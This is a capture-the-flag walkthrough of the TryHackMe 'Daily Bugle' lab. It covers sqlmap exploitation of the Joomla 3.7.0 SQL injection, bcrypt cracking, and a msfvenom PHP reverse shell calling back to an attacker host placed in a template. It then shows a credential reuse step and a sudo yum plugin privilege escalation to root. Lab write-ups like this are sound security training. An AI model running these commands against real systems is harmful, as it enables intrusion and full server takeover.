# Daily Bugle TryHackMe Walkthrough

**Author:** Adrian Korwel 

**Difficulty:** Hard  

**Objective:** Gain root access and retrieve the flags

---


## Overview

In this report, I document how I compromised the "Daily Bugle" machine on TryHackMe using only the information provided and publicly available resources. The goal was to gain user and root access, capturing both the user and root flags along the way.

---

## 1. Reconnaissance

I began with a basic Nmap scan to enumerate open ports and services:

```bash
nmap -sS -sV -O 10.10.171.13
```

**Results:**

* Port 22: SSH (OpenSSH 7.4, protocol 2.0)
* Port 80: HTTP (Apache 2.4.6, PHP/5.6.40)
* Port 3306: MySQL/MariaDB (unauthorized)
* Hostname: ip-10-10-162-223.eu-west-1.compute.internal
* MAC Address: 02:72:4F:1F:35:95 (Unknown)
* OS: Linux 3.10–3.13 (likely CentOS 7 based on Apache/PHP combo)

**Additional Enumeration:**

* Visiting the website at `http://10.10.171.13` revealed a Joomla-based CMS but no obvious login or author paths.
* Discovered `/administrator` endpoint manually and confirmed Joomla login interface.
* Inspected the HTTP headers and `robots.txt` which disallowed access to common Joomla directories.
* Detected Joomla! version 3.7.0 from page source and HTTP responses.

---

## 2. Web Enumeration

Visiting `http://10.10.171.13`, I saw a Joomla-based news site. I used gobuster to find additional directories:

```bash
gobuster dir -u http://10.10.171.13 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Findings:**

* /administrator
* /robots.txt
* Other Joomla-specific directories

Visiting `/administrator` revealed a Joomla admin login page. By checking `/administrator/manifests/files/joomla.xml`, I confirmed the Joomla version was **3.7.0**.

---

## 3. Joomla 3.7.0 SQL Injection

Researching the Joomla version led to the discovery of **CVE-2017-8917**, a SQLi vulnerability in the `com_fields` component.

I used sqlmap to exploit this:

```bash
sqlmap -u "http://10.10.171.13/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -p list[fullordering] --dbs
```

From this, I identified the `joomla` database. I then enumerated tables:

```bash
sqlmap -u "<same_url>" -p list[fullordering] --dbms=MySQL -D joomla --tables
```

I found `#__users` and dumped its contents:

```bash
sqlmap -u "<same_url>" -p list[fullordering] --dbms=MySQL -D joomla -T #__users --dump
```

**Credentials obtained:**

* Username: jonah
* Password Hash: `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`

This is a bcrypt hash format, which requires a dictionary attack to crack.

---

## 4. Cracking the Hash

I used John the Ripper with the rockyou wordlist:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Password recovered:** `spiderman123`

---

## 5. Joomla Admin Login and Remote Code Execution

Logged into the admin panel at `/administrator` using:

* Username: jonah
* Password: spiderman123

I edited the Protostar template to include a PHP reverse shell using msfvenom:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f raw > shell.php
```

Then set up a Metasploit listener:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run -j
```

Navigating to the shell file executed the payload, opening a Meterpreter session as the `apache` user.

---

## 6. Local Enumeration

I uploaded and ran `linpeas.sh`. It revealed the following:

* A user `jjameson`
* MySQL credentials in `/var/www/html/configuration.php`: `nv5uz9r3ZEDzVjNu`

---

## 7. Privilege Escalation to User `jjameson`

I attempted to switch user with the recovered password:

```bash
su jjameson
Password: nv5uz9r3ZEDzVjNu
```

It worked. As `jjameson`, I found the **user flag** in:

```bash
cat /home/jjameson/user.txt
```

---

## 8. Privilege Escalation to Root

Running `sudo -l` showed:

```bash
User jjameson may run the following commands on dailybugle:
  (ALL) NOPASSWD: /usr/bin/yum
```

From GTFOBins, I used the yum plugin exploit:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

This dropped me into a root shell. I confirmed with:

```bash
whoami
```

And retrieved the **root flag** from:

```bash
cat /root/root.txt
```

---

## Summary

* Initial access: SQLi in Joomla 3.7.0 → admin panel
* Remote code execution via template editing
* Local enumeration reveals user `jjameson` and credentials
* Lateral movement via `su`
* Privilege escalation via `sudo yum`

---

## Lessons Learned

- Documentation is essential: I initially missed a discovered password due to poor note-taking. Always record every detail, including credentials, versions, and paths.
- Credential reuse is common: The MySQL root password was reused by a system user. This reinforces the importance of testing credentials across multiple services and accounts.
- Web application vulnerabilities can lead to full system compromise: A simple SQL injection ultimately led to remote code execution and root access.
- Enumeration is key: Tools like linPEAS and thorough manual enumeration uncovered misconfigurations that enabled privilege escalation.
- Know your tools: Leveraging tools such as sqlmap, john, Metasploit, and GTFOBins was instrumental in navigating and exploiting this box efficiently.
- Validate findings with public CVEs and exploits: CVE-2017-8917 was publicly documented and exploited, saving time in developing a working attack chain.

---

### Flags

* **User flag**: /home/jjameson/user.txt
* **Root flag**: /root/root.txt
